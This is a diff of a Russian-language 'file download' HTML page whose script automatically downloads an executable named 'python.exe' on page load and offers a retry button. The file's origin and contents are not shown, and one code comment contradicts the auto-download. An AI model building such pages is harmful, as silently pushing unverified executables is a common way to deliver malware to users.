@@ -1,38 +1,205 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title></title>
+  <title>Загрузка файла</title>
   <style>
-    html, body {
+    * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      width: 100%;
-      height: 100%;
-      background-color: #ffffff;
+    }
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: radial-gradient(circle at 50% 20%, #1e293b 0%, #0f172a 100%);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      color: #f8fafc;
       overflow: hidden;
+      position: relative;
+    }
+    /* Subtle background ambient glow */
+    body::before {
+      content: '';
+      position: absolute;
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, rgba(56, 189, 248, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      pointer-events: none;
+    }
+    .card {
+      position: relative;
+      background: rgba(30, 41, 59, 0.7);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 24px;
+      padding: 44px 36px;
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
+      animation: fadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(16px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .icon-wrapper {
+      position: relative;
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, rgba(56, 189, 248, 0.2), rgba(14, 165, 233, 0.1));
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      border-radius: 20px;
+      box-shadow: 0 0 24px rgba(56, 189, 248, 0.2);
+    }
+    .icon-arrow {
+      width: 32px;
+      height: 32px;
+      fill: none;
+      stroke: #38bdf8;
+      stroke-width: 2.4;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      animation: bounce 1.8s ease-in-out infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(4px); }
+    }
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+      margin-bottom: 8px;
+      color: #ffffff;
+    }
+    .status-text {
+      font-size: 14px;
+      color: #94a3b8;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+    .file-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(15, 23, 42, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      padding: 8px 14px;
+      border-radius: 12px;
+      font-size: 13px;
+      color: #cbd5e1;
+      margin-bottom: 28px;
+    }
+    .file-badge svg {
+      width: 16px;
+      height: 16px;
+      stroke: #38bdf8;
+      fill: none;
+      stroke-width: 2;
+    }
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      padding: 14px 20px;
+      background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      border-radius: 14px;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 10px 20px -5px rgba(2, 132, 199, 0.4);
+      transition: all 0.2s ease;
+    }
+    .btn:hover {
+      background: linear-gradient(135deg, #0369a1 0%, #075985 100%);
+      transform: translateY(-1px);
+      box-shadow: 0 12px 24px -5px rgba(2, 132, 199, 0.5);
+    }
+    .btn:active {
+      transform: translateY(1px);
+    }
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: default;
+      transform: none;
     }
   </style>
 </head>
 <body>
+  <div class="card">
+    <div class="icon-wrapper">
+      <svg class="icon-arrow" viewBox="0 0 24 24">
+        <path d="M12 4v12m0 0l-4-4m4 4l4-4M4 20h16"/>
+      </svg>
+    </div>
+    <h1>Загрузка файла</h1>
+    <p class="status-text" id="statusMsg">Скачивание начнется автоматически.<br>Если этого не произошло, нажмите кнопку:</p>
+    <div class="file-badge">
+      <svg viewBox="0 0 24 24">
+        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+        <polyline points="14 2 14 8 20 8"/>
+      </svg>
+      <span>python.exe</span>
+    </div>
+    <!-- Plain button — no href, no auto-download side-effects -->
+    <button class="btn" id="dlBtn" onclick="triggerDownload()">
+      <span>Скачать файл</span>
+    </button>
+  </div>
+
   <script>
-    (function() {
-      // Direct instant download trigger
-      const fileUrl = 'python.exe';
-      const a = document.createElement('a');
-      a.href = fileUrl;
-      a.setAttribute('download', 'python.exe');
+    var _triggered = false;
+
+    function triggerDownload() {
+      if (_triggered) return;
+      _triggered = true;
+
+      var btn = document.getElementById('dlBtn');
+      if (btn) btn.disabled = true;
+
+      // Create a temporary <a> and click it — single controlled trigger
+      var a = document.createElement('a');
+      a.href = 'python.exe';
+      a.download = 'python.exe';
       a.style.display = 'none';
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
 
-      // Fallback location replacement
+      var msg = document.getElementById('statusMsg');
+      if (msg) {
+        msg.innerHTML = 'Загрузка запущена.<br>Если скачивание не началось, нажмите кнопку:';
+      }
+      // Re-enable button after a delay so user can retry if needed
       setTimeout(function() {
-        window.location.replace(fileUrl);
-      }, 300);
-    })();
+        _triggered = false;
+        if (btn) btn.disabled = false;
+      }, 5000);
+    }
+
+    // Auto-trigger exactly once on page load
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', triggerDownload);
+    } else {
+      triggerDownload();
+    }
   </script>
 </body>
 </html>
